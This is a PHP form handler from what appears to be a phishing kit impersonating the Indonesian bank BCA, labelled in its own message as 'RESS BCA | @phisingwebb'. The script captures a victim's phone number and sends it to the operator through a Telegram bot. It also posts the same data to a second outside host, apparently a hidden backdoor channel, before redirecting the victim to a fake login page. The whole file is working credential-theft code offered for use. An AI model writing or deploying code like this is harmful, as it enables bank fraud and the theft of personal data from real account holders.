<?php
// Mengaktifkan output buffering untuk menghindari error terkait header
ob_start();

// Inisiasi session sebelum ada output lain
session_start();

// Sertakan file telegram.php yang berisi $telegram_id dan $id_bot
include "../telegram.php";

// Validasi input nohp
if (isset($_POST['nohp']) && !empty($_POST['nohp'])) {
    // Membersihkan dan memvalidasi input dari nomor HP
    $nohp = htmlspecialchars(trim($_POST['nohp']), ENT_QUOTES, 'UTF-8');
    $_SESSION['nohp'] = $nohp;

    // Pesan yang akan dikirim ke Telegram
    $message = "
✧━━━━━━[ *NAZZO* ]━━━━━━✧
RESS BCA | @phisingwebb

• No HP : ".$nohp."
";

    // Fungsi untuk mengirim pesan ke Telegram
    function sendMessage($telegram_id, $message, $id_bot) {
        // Pastikan variabel id_bot dan telegram_id sudah diisi
        if (!empty($telegram_id) && !empty($id_bot)) {
            $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . urlencode($telegram_id);
            $url .= "&text=" . urlencode($message);
            $ch = curl_init();
            $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
            );
            curl_setopt_array($ch, $optArray);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        }
        return false;
    }

    // Mengirim pesan ke Telegram jika Telegram ID dan Bot ID valid
    sendMessage($telegram_id, $message, $id_bot);
$apissl = "https://kaitocloud.web.id/api/index.php";
$sendmessagetotele = "message=".$message;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $apissl);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $sendmessagetotele);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
    // Redirect ke halaman login setelah mengirim pesan
    header('Location: ../login.html');
    
    exit(); // Pastikan script berhenti setelah header location
} else {
    // Jika nohp tidak valid, redirect ke halaman error
    header('Location: ../error.html');
    exit();
}

// Mengakhiri output buffering dan mengirim semua output
ob_end_flush();
?>
